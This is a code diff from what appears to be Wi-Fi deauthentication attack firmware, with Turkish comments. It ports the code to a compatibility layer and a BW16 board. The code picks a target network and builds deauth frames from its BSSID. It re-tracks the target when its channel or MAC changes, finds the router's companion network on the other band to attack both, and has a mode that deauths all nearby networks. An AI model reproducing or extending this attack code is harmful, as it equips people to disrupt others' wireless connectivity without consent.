@@ -1,4 +1,5 @@
 #include <WiFi.h>
+#include "platform_compat.h"
 #include "types.h"
 #include "board_hal.h"
 #include "deauth.h"
@@ -34,9 +35,9 @@ static void sniffer_cb(const uint8_t *frame, uint16_t len);
 static int find_companion_network(const uint8_t *primary_bssid, int primary_ch) {
   bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
   for (int i = 0; i < num_networks; i++) {
-    int ch = WiFi.channel(i);
+    int ch = WiFi_channel_scan(i);
     if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue; // aynı bant, atla
-    if (memcmp(primary_bssid, WiFi.BSSID(i), 3) == 0) return i; // OUI eşleşti
+    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i; // OUI eşleşti
   }
   return -1;
 }
@@ -344,25 +345,25 @@ void retrack_deauth_target() {
 
   hal_wifi_set_promiscuous(false);
 
-  int n = WiFi.scanNetworks(false, true, false, 120);
+  int n = WiFi_scanNetworks_ex();
   bool found_primary   = false;
   bool found_companion = false;
 
   for (int i = 0; i < n; i++) {
-    const char *ssid = WiFi.SSID(i).c_str();
+    const char *ssid = WiFi_SSID_cstr(i);
 
     // Birincil hedef: BSSID OUI + SSID eşleşmesi
     if (!found_primary &&
         strcmp(ssid, deauth_target_ssid) == 0 &&
-        memcmp(WiFi.BSSID(i), deauth_target_bssid, 3) == 0) {
+        memcmp(WiFi_BSSID_scan(i), deauth_target_bssid, 3) == 0) {
 
-      int    new_ch       = WiFi.channel(i);
+      int    new_ch       = WiFi_channel_scan(i);
       bool   ch_changed   = (new_ch != deauth_target_channel);
-      bool   mac_changed  = memcmp(WiFi.BSSID(i), deauth_target_bssid, 6) != 0;
+      bool   mac_changed  = memcmp(WiFi_BSSID_scan(i), deauth_target_bssid, 6) != 0;
 
       if (ch_changed || mac_changed) {
         deauth_target_channel = new_ch;
-        memcpy(deauth_target_bssid, WiFi.BSSID(i), 6);
+        memcpy(deauth_target_bssid, WiFi_BSSID_scan(i), 6);
         memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
         memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
         WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
@@ -377,15 +378,15 @@ void retrack_deauth_target() {
 
     // Eşlikçi hedef: OUI eşleşmesi + farklı bant
     if (!found_companion && deauth_has_companion &&
-        memcmp(deauth_target_bssid, WiFi.BSSID(i), 3) == 0 &&
-        IS_5GHZ_CHANNEL(WiFi.channel(i)) != IS_5GHZ_CHANNEL(deauth_target_channel)) {
+        memcmp(deauth_target_bssid, WiFi_BSSID_scan(i), 3) == 0 &&
+        IS_5GHZ_CHANNEL(WiFi_channel_scan(i)) != IS_5GHZ_CHANNEL(deauth_target_channel)) {
 
-      int new_ch2 = WiFi.channel(i);
+      int new_ch2 = WiFi_channel_scan(i);
       if (new_ch2 != deauth_target2_channel ||
-          memcmp(WiFi.BSSID(i), deauth_target2_bssid, 6) != 0) {
+          memcmp(WiFi_BSSID_scan(i), deauth_target2_bssid, 6) != 0) {
         deauth_target2_channel = new_ch2;
-        memcpy(deauth_target2_bssid, WiFi.BSSID(i), 6);
-        strncpy(deauth_target2_ssid, WiFi.SSID(i).c_str(), 32);
+        memcpy(deauth_target2_bssid, WiFi_BSSID_scan(i), 6);
+        strncpy(deauth_target2_ssid, WiFi_SSID_cstr(i), 32);
         deauth_target2_ssid[32] = '\0';
         DEBUG_PRINTF("Eslıkci yeni kanal: %d %s\n",
           deauth_target2_channel,
@@ -396,7 +397,7 @@ void retrack_deauth_target() {
 
     if (found_primary && (!deauth_has_companion || found_companion)) break;
   }
-  WiFi.scanDelete();
+  WiFi_scanDelete();
 
   hal_wifi_set_promiscuous(true);
   hal_wifi_set_promiscuous_filter();
@@ -412,10 +413,10 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   deauth_has_companion = false;
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
-    strncpy(deauth_target_ssid, WiFi.SSID(wifi_number).c_str(), 32);
+    strncpy(deauth_target_ssid, WiFi_SSID_cstr(wifi_number), 32);
     deauth_target_ssid[32]  = '\0';
-    deauth_target_channel   = WiFi.channel(wifi_number);
-    memcpy(deauth_target_bssid, WiFi.BSSID(wifi_number), 6);
+    deauth_target_channel   = WiFi_channel_scan(wifi_number);
+    memcpy(deauth_target_bssid, WiFi_BSSID_scan(wifi_number), 6);
     memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
     memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
 
@@ -423,9 +424,9 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     int comp_idx = find_companion_network(deauth_target_bssid, deauth_target_channel);
     if (comp_idx >= 0) {
       deauth_has_companion      = true;
-      deauth_target2_channel    = WiFi.channel(comp_idx);
-      memcpy(deauth_target2_bssid, WiFi.BSSID(comp_idx), 6);
-      strncpy(deauth_target2_ssid, WiFi.SSID(comp_idx).c_str(), 32);
+      deauth_target2_channel    = WiFi_channel_scan(comp_idx);
+      memcpy(deauth_target2_bssid, WiFi_BSSID_scan(comp_idx), 6);
+      strncpy(deauth_target2_ssid, WiFi_SSID_cstr(comp_idx), 32);
       deauth_target2_ssid[32] = '\0';
       DEBUG_PRINTF("Cift bant tespit edildi! Eslıkci: kanal %d %s BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
         deauth_target2_channel,
@@ -447,7 +448,9 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   } else {
     DEBUG_PRINTLN("Tum aglara deauth (2.4+5GHz)...");
     WiFi.softAPdisconnect();
+#ifndef BOARD_BW16
     WiFi.mode(WIFI_MODE_STA);
+#endif
     delay(100);
     apply_max_performance();
   }
